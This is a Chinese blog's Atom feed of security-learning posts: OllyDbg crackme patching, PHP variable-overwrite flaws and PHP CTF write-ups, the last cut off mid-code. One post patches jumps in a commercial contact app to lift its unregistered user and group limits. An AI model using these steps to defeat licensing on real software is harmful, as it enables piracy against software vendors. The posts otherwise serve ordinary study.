<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>leaf</title>
  
  
  <link href="http://just-aleaf.github.io/atom.xml" rel="self"/>
  
  <link href="http://just-aleaf.github.io/"/>
  <updated>2022-09-08T03:34:50.809Z</updated>
  <id>http://just-aleaf.github.io/</id>
  
  <author>
    <name>叶子</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逆向破解学习</title>
    <link href="http://just-aleaf.github.io/2022/09/03/%E9%80%86%E5%90%91/"/>
    <id>http://just-aleaf.github.io/2022/09/03/%E9%80%86%E5%90%91/</id>
    <published>2022-09-03T12:17:06.000Z</published>
    <updated>2022-09-08T03:34:50.809Z</updated>
    
    <content type="html"><![CDATA[<p>最近学习小甲鱼的解密篇希望有一天自己也可以破解软件使用这里就进行一下学习记录</p><h2 id="（1）MESSAGEBOX修改弹窗标题"><a href="#（1）MESSAGEBOX修改弹窗标题" class="headerlink" title="（1）MESSAGEBOX修改弹窗标题"></a>（1）MESSAGEBOX修改弹窗标题</h2><p> 这里我们想要让他显示我们想要显示的</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/63134af22b8ba.png" alt="QQ截图20220903202408.png">首先我们od打开exe<img src="http://wp.xiaohuang.vip/p/9/2022/09/03/63134ad1707d4.png" alt="QQ截图20220903203813.png"></p><p>f8运行知道弹出对话框</p><p>找到之后我们发现call指令猜测里面就是类似messagebox的指令</p><p>打下断点</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/63134b445fb98.png" alt="QQ截图20220903204029.png"></p><p>f2重新载入—–》f9到达断点处—–》f7进入call指令</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/63134be82caa2.png" alt="QQ截图20220903204310.png"></p><p>这里我们发现push指令推入了参数然后call对应地址</p><p>我们这里可以发现对应的地址我们在数据窗口中进行地址搜索修改即可<img src="http://wp.xiaohuang.vip/p/9/2022/09/03/631350098678f.png" alt="QQ截图20220903205719.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/63134ffacb0c8.png" alt="QQ截图20220903205749.png"></p><h2 id="（2）TraceMe破解登录界面"><a href="#（2）TraceMe破解登录界面" class="headerlink" title="（2）TraceMe破解登录界面"></a>（2）TraceMe破解登录界面</h2><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/6313534301a8d.png" alt="QQ截图20220903210915.png"></p><p>这里是我们输入之后进行校验而校验之前会需要从文本框中读取字符床</p><p>函数GetDlgItemTextA、GetDlgItemTextW、GetWindowTextA、GetWindowTextW可以从编辑框中取字符串</p><p>我们尝试搜索这几个函数</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/631353ae27e18.png" alt="屏幕截图 2022-09-03 205845.png"></p><p>找到之后下断点这里就是获取文本框字符串的地方</p><p>然后我们输入内容继续向下运行</p><p>发下显示我们输入内容的地方</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/631353ae27e18.png" alt="屏幕截图 2022-09-03 205845.png"></p><p>我们发现这里push了三个edx为用户名，ebx为字符数，eax为密码</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/631353ae27e18.png" alt="屏幕截图 2022-09-03 205845.png"></p><p>然后下一句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call  00401340</span><br></pre></td></tr></table></figure><p>应该是进行校验的函数</p><p>我们可以看到下面进行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test eax，eax//测试寄存器是否为空（为0的时候Z标志位回置0）</span><br></pre></td></tr></table></figure><p>汇编中会把函数的返回结果都统一存储在eax中（当超出寄存器的容量是会存储返回值的地址）</p><p>这里我们输入错误返回值不为0会满足jz的跳转要求进行跳转（我们这里先跳转运行发现返回错误）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/631353ae27e18.png" alt="屏幕截图 2022-09-03 205845.png"></p><p>所以我们这里修改Z的值让其不进行跳转</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/03/631359c0c69e8.png" alt="QQ截图20220903214145.png"></p><h2 id="（3）reverseMe破解keyfile-dat"><a href="#（3）reverseMe破解keyfile-dat" class="headerlink" title="（3）reverseMe破解keyfile.dat"></a>（3）reverseMe破解keyfile.dat</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>打开exe</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314970b3e986.png" alt="QQ截图20220904201553.png"></p><p>然后f8运行了解一下exe构成</p><p>发现loadIconA这里加载了图标</p><p>然后发现于一个CreateFileA（filename&#x3D;keyfile.dat）说明我们需要建一个对应文件</p><p>之后又发现了Readfile所以我们猜测是读取上面的keyfile文件进行校验</p><p>大概逻辑懂得我们先尝试暴力直接跳转（寻找跳转的指令）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631498875442e.png" alt="QQ图片20220904202224.png"></p><p>我们发现这里jl指令条件跳转到报错所以我们不能让跳转(SF!&#x3D;OF),修改S标志位让其不进行跳转</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631498875442e.png" alt="QQ图片20220904202224.png"></p><p>同理修改ZF标志位再次阻止跳转</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/631498875442e.png" alt="QQ图片20220904202224.png"></p><p>我们找到跳转正确的指令跳转即可暴力破解</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63149960ce8b9.png" alt="QQ截图20220904202600.png"></p><h3 id="算法破解"><a href="#算法破解" class="headerlink" title="算法破解"></a>算法破解</h3><p>我们先找到对比的算法</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63149c38a1cd0.png" alt="QQ截图20220904203631.png"></p><p>这里test eax eax将eax置0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004010B8  cmp dword ptr ds:[0x402173],0x10</span><br><span class="line">[0x402173]是Readfile的第三个参数返回的文件中的字节数</span><br></pre></td></tr></table></figure><p>我们发现这里对0x4021173地址的内容和16（这里10为16进制）比较</p><p>这里如果对应值小于16的话就会是SF标志位1导致跳转所以我们这里文件中字节数要大于等于16</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004010C1 mov al,byte ptr ds:[ebx+0x40211A]</span><br><span class="line">004010C7 cmp al,0x0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里ebx之前清零现在每次加1遍历每一个文件内容</p><p>然后让其于0比较如果为0就会跳转</p><p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20220904204554134.png" alt="image-20220904204554134"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004010D3 cmp esi,0x8</span><br></pre></td></tr></table></figure><p>于8进行比较如果小于8就会跳转报错当这里大于等于8是才会跳转到正确位置</p><p>所以我们这里就要求文件中要有内容这样才不会直接al&#x3D;0跳转进行esi和8比较</p><p>当我们文件有内容al不等于0时</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/63149f50b9549.png" alt="QQ截图20220904205118.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004010CB  cmp al,0x47</span><br><span class="line">004010CD  jnz XreverseM.004010D0</span><br><span class="line">004010CF  inc esi</span><br><span class="line">004010D0  inc ebx</span><br></pre></td></tr></table></figure><p>发现al（文件内容）于G（应为我们获取文件内容为ascii格式所以我们比较前要转换一致0x47转换ascii为G）比较如果相同结果为0就会令标志位置1不进行跳转，让esi,ebx自增之后循环</p><p>当满足esi大于等于8时就会正确跳转</p><p>我们只需要对应将跳转错误出改为nop并保存即可破解</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314a32c1e901.png" alt="QQ截图20220904210746.png"></p><h2 id="（4）RegisterMe的NAG去除"><a href="#（4）RegisterMe的NAG去除" class="headerlink" title="（4）RegisterMe的NAG去除"></a>（4）RegisterMe的NAG去除</h2><p>首先什么是NAG，就是使用时提醒你注册烦人的弹框</p><p>打开我们发现了两个nag弹窗指令位置</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314a71e076e2.png" alt="QQ截图20220904212354.png"></p><h3 id="思路一-全部nop掉"><a href="#思路一-全部nop掉" class="headerlink" title="思路一:全部nop掉"></a><strong>思路一:全部nop掉</strong></h3><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314a7eda818d.png" alt="QQ截图20220904212802.png"></p><h3 id="思路二-跳转过去"><a href="#思路二-跳转过去" class="headerlink" title="思路二:跳转过去"></a><strong>思路二:跳转过去</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040100F  je XRegister.00401024</span><br></pre></td></tr></table></figure><p>发现这条指令可以跳转过第一个nag修改指令为jmp</p><p> <img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314a8d238e8c.png" alt="QQ截图20220904213149.png"></p><p>然后将第二个nag用nop填充即可</p><h3 id="思路三是将messagebox句柄修改"><a href="#思路三是将messagebox句柄修改" class="headerlink" title="思路三是将messagebox句柄修改"></a><strong>思路三是将messagebox句柄修改</strong></h3><p>查看API帮助可以发现messagebox的第一个参数是父句柄（可以理解为他所属于谁如果这里的父进程错误他作为子进程也会失效）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314afe31eaa1.png" alt="QQ截图20220904220159.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314b0ab03164.png" alt="QQ截图20220904220510.png"></p><p>这里我们发现这里两个父句柄都为null，当我们随便赋一个不存在的值的时候，父程序无法运行那么对应子程序也无法运行两个nag弹框就无法弹出</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314b10ca100a.png" alt="QQ截图20220904220658.png"></p><h3 id="思路四-修改PE头然后修改程序入口"><a href="#思路四-修改PE头然后修改程序入口" class="headerlink" title="思路四:修改PE头然后修改程序入口"></a><strong>思路四:修改PE头然后修改程序入口</strong></h3><p>我们观察到AffressOfEntrypoint(入口)为00401000，会包含第一个nag弹窗所以我们就考虑把入口放在第一个nag弹窗之后</p><p>首先我们需要找到pe头的位置</p><p>点击工具栏中’M’，找到pe文件头双击进入内存文件头的位置</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314ac4f9ebe0.png" alt="QQ截图20220904214644.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314acdd0dc83.png" alt="QQ截图20220904214907.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040003C  C0000000  DD 000000C0; Offset to PE signature</span><br></pre></td></tr></table></figure><p>然后这行代码说明了pe文件头的地址c0</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314ad35aee17.png" alt="QQ截图20220904215037.png"></p><p>然后我们找到AdressOfEntryPoint找到对应地址(4000E8)即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314adc04a467.png" alt="QQ截图20220904215247.png"></p><p>在数据区追踪400E8修改401000为401024即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/04/6314af2564f15.png" alt="QQ截图20220904215820.png"></p><h2 id="（5）pixtopoanbook破解限制功能"><a href="#（5）pixtopoanbook破解限制功能" class="headerlink" title="（5）pixtopoanbook破解限制功能"></a>（5）pixtopoanbook破解限制功能</h2><p>这是一个社交软件我们可以看到当我们没有购买注册的时候只允许我们创建4个好友和3个组别</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/6319591fa14b0.png" alt="QQ截图20220908105231.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/631959201f79d.png" alt="QQ截图20220908105248.png"></p><p>这里我们要破解这些功能实现直接使用</p><p>我们先运行至弹出运行界面的位置，然后我们点击要创建用户会出现上面的弹窗</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/631959f70ac83.png" alt="QQ截图20220908105646.png"></p><p>我们可以看到这里点击add然后弹窗后按下暂停键之后会跳转到系统领空(此时我们也无法点击软件功能)，我们alt+f9返回用户，然后点击确认之后返回到了程序接管</p><p>返回之后运行就会回到我们弹窗真正的对应位置</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63195b8066fec.png" alt="QQ截图20220908110257.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63195b8000c9f.png" alt="QQ截图20220908110308.png"></p><p>上移一部分我们可以发现弹窗中的内容(这里使用本身进程间接调用了messagebox，通过)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00412DD0   cmp     eax, 4</span><br><span class="line">00412DD3   jl      short 00412DEF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到这里eax和4进行了比较当我们创建用户大于4的时候就会不满足jl的跳转要求导致跳转弹窗</p><p>所以我们这里想要的是不弹窗这里要无条件跳转所以我们就让其jmp</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63195d93e1255.png" alt="QQ截图20220908111209.png"></p><p>这样我们就破解了创建用户的功能限制</p><p>对于组类创建也是一样的方法</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63195dff55ca0.png" alt="QQ截图20220908111357.png"></p><p>找到弹窗对应的位置</p><p>然后发现了对应判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00408B05   cmp     eax, 3</span><br><span class="line">00408B08   jl      short 00408B34</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后同理我们让其无条件跳转即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63195e6ac01f5.png" alt="QQ截图20220908111544.png"></p><p>然后我们发现软件界面也还是会有一些表示没有注册的提醒</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63195e8cbb0ae.png" alt="QQ截图20220908111620.png"></p><p>看的就不舒服</p><p>点击工具栏中的M按键进入内存中crtl+b搜索对应文本位置</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/63196088ed421.png" alt="QQ截图20220908112447.png"></p><p>然后在数据去追踪地址保存即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/08/631960dac2769.png" alt="QQ截图20220908112609.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近学习小甲鱼的解密篇希望有一天自己也可以破解软件使用这里就进行一下学习记录&lt;/p&gt;
&lt;h2 id=&quot;（1）MESSAGEBOX修改弹窗标题&quot;&gt;&lt;a href=&quot;#（1）MESSAGEBOX修改弹窗标题&quot; class=&quot;headerlink&quot; title=&quot;（1）MESSA</summary>
      
    
    
    
    <category term="逆向" scheme="http://just-aleaf.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="http://just-aleaf.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>PHP变量覆盖</title>
    <link href="http://just-aleaf.github.io/2022/08/25/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    <id>http://just-aleaf.github.io/2022/08/25/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</id>
    <published>2022-08-25T15:43:32.000Z</published>
    <updated>2022-09-03T12:17:32.855Z</updated>
    
    <content type="html"><![CDATA[<p>最近在进行php代码审计学习的时候遇到了关于变量覆盖的题，然后考虑到变量覆盖也有几种情况这里就进行整理学习一下</p><h2 id="什么是变量覆盖"><a href="#什么是变量覆盖" class="headerlink" title="什么是变量覆盖"></a>什么是变量覆盖</h2><p>所谓的变量覆盖就是值我们使用我们传入的参数值来替换程序中原本存在的变量值</p><p>可能存在变量覆盖的地方:$$使用不当，extract()函数使用不当，import_request_variables()使用不当，parse_str()函数使用不当，开启了全局变量注册</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="（1）全局变量覆盖"><a href="#（1）全局变量覆盖" class="headerlink" title="（1）全局变量覆盖"></a>（1）全局变量覆盖</h3><p>在PHP5.3之前会默认开启一个register_globals的全局函数，这个函数是用来注册全局变量的（当你传入参数的时候可以直接注册为全局变量进行使用），</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$id=0;</span><br><span class="line">echo &#x27;获取id值 :&#x27;.$_GET[&#x27;id&#x27;].&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &#x27;$id :&#x27;.$id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里可以本地搭建进行测试</p><p>这里我们运行测试这个php脚本的时候我们就可以发现.$_GET[‘id’]输出值为我们这里get输入的值，但是$id输出的会仍然是已经定义过的0</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/26/6307a29b952ce.png" alt="QQ截图20220826002509.png"></p><p>这里说明只是将输入的id参数用$_GET[‘id’]来接收参数，而$id并没有用来接收我们传入的参数值</p><p>这里就是register_globals的区别了</p><p>如果我们这里打开register_globals的时候这里就会使用$id来接受传入的参数值但是这里当原有参数已经声明之后就无法再次进行覆盖所以及时我们打开了输出的id也仍然会是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($test)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;hello&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果此时我们打开了register_globals的时候，我们构造url:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/1.php?test=1</span><br></pre></td></tr></table></figure><p>我们就会发现输出了hello</p><p>这里就直接作为了全局变量进行了注册使用造成了全局变量覆盖</p><h3 id="（2）extract-变量覆盖"><a href="#（2）extract-变量覆盖" class="headerlink" title="（2）extract()变量覆盖"></a>（2）extract()变量覆盖</h3><p>extract()函数将数组中变量导入到当前的符号表中</p><p>但是与全局变量覆盖不同的是这里会有一个默认设置当如果传入的参数和代码本身声明的代码冲突的时候会使用传入的参数进行覆盖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=2;</span><br><span class="line">extract($_GET)</span><br><span class="line">if($a == 1)&#123;</span><br><span class="line">echo &quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;damie&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/26/6307a75503dd3.png" alt="QQ截图20220826004558.png"></p><p>代码中声明的$a为2所以会按照damie输出</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/26/6307a7842ecaf.png" alt="QQ截图20220826004625.png"></p><p>当传入参数a&#x3D;1时有extract()函数处理这里和原本声明定义冲突会采取默认覆盖满足了if输出为hello</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/26/6307a784975d2.png" alt="QQ截图20220826004635.png"></p><h3 id="（3）-变量覆盖"><a href="#（3）-变量覆盖" class="headerlink" title="（3）$$变量覆盖"></a>（3）$$变量覆盖</h3><p>$$定义的变量为可变变量（一个变量的变量名可以动态的设置和使用），</p><p>一个可变变量获取一个变量的值来作为他的变量名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;hi&#x27;</span><br><span class="line">$$a=&#x27;hello&#x27;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/27/63098d37d083c.png" alt="QQ截图20220827111843.png"></p><p>这里可以看到这里将$a取值为hi，然后有使用了$$，这里的$$a可以理解为$($a)，或者$(hi)，当输出两种类型时都可以输出对应值</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/27/63098d384f023.png" alt="QQ截图20220827111848.png"></p><p>这里$$变量覆盖在ctf中会经常和foreach循环一起考察</p><p>这里了解一下foreach的语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A.</span><br><span class="line">foreach(array_expression as $ value)&#123;</span><br><span class="line"></span><br><span class="line">statement//当循环attay_expression数组的时候将其值赋值给$value</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">B.</span><br><span class="line">foreach(array_exprssion as $key =&gt; $value)&#123;</span><br><span class="line">statement//在赋值的同时将键名赋值给$key</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以看到遍历输入的get参数然后将键名赋值给$key,将对应参数值赋值给$value<img src="http://wp.xiaohuang.vip/p/9/2022/08/27/63099133af6b6.png" alt="QQ截图20220827113603.png"></p><p>我们url传参了a&#x3D;1，所以这里键名a传给了$key，对应值1传给了$value,同时使用$$key就相当于$a,就达成了变量覆盖</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/27/6309913425238.png" alt="QQ截图20220827113607.png"></p><h3 id="（3）parse-str-定义"><a href="#（3）parse-str-定义" class="headerlink" title="（3）parse_str()定义"></a>（3）parse_str()定义</h3><p>将查询到的字符串解析到变量中(他在解析的时候不会验证是否存在变量所以如果这里已有声明变量则会直接覆盖)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str(string,array)</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/27/630a2a814b1ff.png" alt="QQ截图20220827222949.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/27/630a2a842c233.png" alt="QQ截图20220827223011.png"></p><p>参考</p><p><a href="https://www.cnblogs.com/xhds/p/12587249.html#_label1">PHP中的变量覆盖漏洞 - 笑花大王 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105849770">(52条消息) 变量覆盖漏洞总结_WHOAMIAnony的博客-CSDN博客_变量覆盖漏洞</a></p><p><a href="https://www.cnblogs.com/yunen/p/10597822.html">变量覆盖漏洞学习及在webshell中的运用 - Yunen的博客 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在进行php代码审计学习的时候遇到了关于变量覆盖的题，然后考虑到变量覆盖也有几种情况这里就进行整理学习一下&lt;/p&gt;
&lt;h2 id=&quot;什么是变量覆盖&quot;&gt;&lt;a href=&quot;#什么是变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;什么是变量覆盖&quot;&gt;&lt;/a&gt;什么</summary>
      
    
    
    
    <category term="知识收集" scheme="http://just-aleaf.github.io/categories/%E7%9F%A5%E8%AF%86%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="知识收集" scheme="http://just-aleaf.github.io/tags/%E7%9F%A5%E8%AF%86%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP_Code_Challenge</title>
    <link href="http://just-aleaf.github.io/2022/08/17/PHP-Code-Challenge/"/>
    <id>http://just-aleaf.github.io/2022/08/17/PHP-Code-Challenge/</id>
    <published>2022-08-16T16:14:25.000Z</published>
    <updated>2022-09-04T09:30:54.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-challenge1"><a href="#1-challenge1" class="headerlink" title="(1)challenge1"></a>(1)challenge1</h2><p>访问靶场位置我们可以发现给出一串字符然后对php代码审计一下</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/17/62fbc6c485236.png" alt="QQ截图20220817001554.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0); </span><br><span class="line">//关闭报错</span><br><span class="line">require __DIR__.&#x27;/lib.php&#x27;; </span><br><span class="line">//DIR获取当前目录路径进而用来确定你要引入的文件位置</span><br><span class="line"></span><br><span class="line">echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">//进行了base64，hex2bin(16进制转ascii)，反转字符串，最后再由ascii转换为十六进制的加密</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><p>所以我们这里就是要对给出的随机值进行反解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">def strrev(string):</span><br><span class="line">return string[::-1]</span><br><span class="line">str = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= &quot;;</span><br><span class="line">str2 = binascii.a2b_hex(strrev(binascii.b2a_hex(base64.b64decode(str))));</span><br><span class="line">print(str2)</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/17/62fbc7186d45f.png" alt="QQ截图20220817003421.png"></p><h2 id="2-challenge2"><a href="#2-challenge2" class="headerlink" title="(2)challenge2"></a>(2)challenge2</h2><p>下载靶场访问环境</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/17/62fc4556a579e.png" alt="QQ截图20220817092452.png"></p><p>通过代码我们可以得出我们需要get赋予time一个在5184000—7776000之间的数字，通过sleep对应时间即可出现flag</p><p>这里我们考虑传入一个位于范围内的时间之后sleep时间过久所以这里考虑进行科学计数法绕过</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/17/62fc46d491e8e.png" alt="QQ截图20220817093920.png"></p><h2 id="3-challenge3"><a href="#3-challenge3" class="headerlink" title="(3)challenge3"></a>(3)challenge3</h2><p>下载环境访问</p><p>发现没什么内容查看源码发现提示访问challenge3.txt</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/17/62fcd356883ec.png" alt="QQ截图20220817193819.png"><img src="http://wp.xiaohuang.vip/p/9/2022/08/17/62fcd3571d78a.png" alt="QQ截图20220817193829.png"></p><p>开始审计这段php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!--challenge3.txt--&gt;&quot;;</span><br><span class="line">require __DIR__.&#x27;/lib.php&#x27;;</span><br><span class="line">if(!$_GET[&#x27;id&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">    header(&#x27;Location: challenge3.php?id=1&#x27;);</span><br><span class="line">    //header(&quot;location:test.php&quot;)跳转url</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">if(stripos($a,&#x27;.&#x27;))</span><br><span class="line">//stripos(string,find,start)</span><br><span class="line">//stripos函数查找字符串在另一个字符串第一次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">    echo &#x27;Hahahahahaha&#x27;;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&#x27;r&#x27;);</span><br><span class="line">if($data==&quot;1112 is a 